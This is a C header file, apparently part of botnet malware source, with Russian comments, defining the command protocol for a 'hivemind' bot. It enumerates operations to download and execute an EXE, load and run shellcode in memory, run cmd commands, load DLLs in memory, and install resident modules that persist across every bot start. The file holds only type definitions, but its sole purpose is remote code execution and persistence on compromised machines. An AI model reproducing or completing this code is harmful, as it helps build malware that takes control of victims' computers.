#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")

struct blob
{
	SIZE_T dwBufferSize;
	LPBYTE lpBuffer;
};

// тип команды, используется в OPERATION_TYPE_COMMAND
typedef enum _hivemind_command_type
{
	COMMAND_DOWNLOADEXEC, // скачать EXE и запустить
	COMMAND_SHELLCODE, // загрузить в память и запустить шеллкод
	COMMAND_CMDEXEC, // исполнить команду в cmd
	COMMAND_DLLLOADER, // загрузить DLL в память
	COMMAND_UNKNOWN
} hivemind_command_type_t;

// тип модуля, ипользуется в OPERATION_TYPE_MODULE
typedef enum _hivemind_module_type
{
	MODULE_RESIDENT, // модуль нужно записать в vfs для запуска при каждом старте бота
	MODULE_NONRESIDENT, // модуль только в памяти, никуда записывать не надо
	MODULE_UNKNOWN
} hivemind_module_type_t;


// тип операции
typedef enum _hivemind_op_type
{
	OPERATION_TYPE_COMMAND, // исполнить команду
	OPERATION_TYPE_MODULE, // загрузить модуль
	OPERATION_TYPE_IGNORE_UNKNOWN // неизвестная операция - игнорим
} hivemind_op_type_t;

struct hivemind_operation_data
{
	hivemind_op_type_t hmOperationType; // тип операции
	union additional_type // операция либо модуль либо команда
	{
		hivemind_module_type_t hmModuleType; // тип модуля
		hivemind_command_type_t hmCommandType; // тип команды
	} additional;
	blob data; // данные
};



struct commandline_params
{
	blob resident_module;
	blob nonresident_module;
	blob downloadexec;
	blob cmdexec;
	blob shellcode;
	blob dllloader;
};